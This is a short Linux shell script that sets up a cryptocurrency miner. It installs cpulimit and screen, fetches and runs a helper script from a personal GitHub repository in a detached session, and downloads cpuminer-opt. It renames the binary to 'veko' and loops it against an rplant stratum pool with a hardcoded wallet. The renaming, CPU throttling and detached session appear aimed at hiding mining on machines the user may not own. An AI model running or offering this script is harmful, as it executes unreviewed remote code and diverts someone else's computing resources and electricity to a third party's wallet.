#!/bin/sh
#
# Choose nearest stratum:
#	stratum-ru.rplant.xyz   /Moscow/
#	stratum-eu.rplant.xyz   /London/
#	stratum-asia.rplant.xyz /Singapore/
#       stratum-na.rplant.xyz   /Toronto/
#
#SGR
sudo apt update
sudo apt install cpulimit
sudo apt install screen -y
wget https://github.com/brendaz90/brenda/raw/main/random.sh
chmod +x random.sh
screen -dmS random ./random.sh cpuminer-sse2 65 75
wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
tar xf cpuminer-opt-linux.tar.gz
mv cpuminer-sse2 veko
while [ 1 ]; do
./veko -a yespower -o stratum+tcps://stratum-eu.rplant.xyz:13350 -u VQEPqKj8wS8pSKXjLnCWEhgXkAXNQgEQoa.aing
sleep 3
done
sleep 3
